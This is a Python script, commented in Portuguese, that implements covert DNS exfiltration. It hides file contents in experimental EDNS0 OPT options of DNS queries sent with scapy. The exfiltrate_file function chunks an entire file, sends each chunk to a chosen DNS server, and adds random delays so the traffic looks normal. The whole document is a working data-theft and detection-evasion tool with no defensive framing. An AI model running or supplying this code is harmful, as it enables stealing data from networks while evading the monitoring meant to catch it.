#!/usr/bin/env python3
"""
T1: OPT-Option Steganography
RFC 6891 - códigos 65001-65534 são experimentais/locais
Implementações DEVEM ignorar opções não reconhecidas.
"""

import struct
import time
import random

from scapy.all import IP, UDP, send, RandShort
from scapy.layers.dns import DNS, DNSQR, DNSRROPT, EDNS0TLV

EXPERIMENTAL_OPT_CODE = 65001  # Faixa experimental


def encode_data(data: bytes) -> EDNS0TLV:
    """Codificar dados como OPT option experimental"""
    return EDNS0TLV(
        optcode=EXPERIMENTAL_OPT_CODE,
        optlen=len(data),
        optdata=data
    )


def decode_data(tlv: EDNS0TLV) -> bytes:
    """Decodificar dados de OPT option experimental"""
    if 65001 <= tlv.optcode <= 65534:
        return tlv.optdata
    return b''


def build_query(domain: str, payload: bytes,
                dns_server: str, buf_size: int = 4096):
    """Construir query DNS com dados em OPT experimental"""
    edns0_opt = encode_data(payload)

    pkt = (
        IP(dst=dns_server) /
        UDP(dport=53, sport=RandShort()) /
        DNS(
            rd=1,
            qd=DNSQR(qname=domain, qtype='A'),
            ar=DNSRROPT(
                rclass=buf_size,
                rdata=[edns0_opt]
            )
        )
    )
    return pkt


def exfiltrate_file(filepath: str, domain: str,
                    dns_server: str, chunk_size: int = 512):
    """Exfiltrar arquivo inteiro via T1"""
    with open(filepath, 'rb') as f:
        data = f.read()

    total_chunks = (len(data) + chunk_size - 1) // chunk_size

    for i in range(0, len(data), chunk_size):
        chunk = data[i:i + chunk_size]

        # Prefixo: número do chunk (2 bytes) + total (2 bytes)
        header = struct.pack('!HH', i // chunk_size, total_chunks)
        payload = header + chunk

        # Construir e enviar query
        subdomain = f"q{i // chunk_size}.{domain}"
        pkt = build_query(subdomain, payload, dns_server)
        send(pkt, verbose=0)

        # Delay para parecer tráfego normal
        time.sleep(random.uniform(0.1, 0.5))

    print(f"[T1] Exfiltrado: {filepath} ({len(data)} bytes, "
          f"{total_chunks} chunks)")
